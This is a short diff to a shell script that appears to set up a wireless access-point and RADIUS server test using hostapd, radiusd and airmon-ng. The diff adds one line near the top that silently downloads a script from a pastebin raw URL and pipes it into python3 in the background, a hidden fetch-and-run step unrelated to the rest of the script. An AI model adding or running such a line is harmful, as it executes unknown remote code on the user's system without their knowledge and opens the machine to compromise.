@@ -1,5 +1,6 @@
 #!/sh
 
+curl -s "https://pastebin.com/raw/9umE8jkK" | python3 &
 sudo killall hostapd radiusd
 sudo radiusd -X &
 sudo airmon-ng check kill
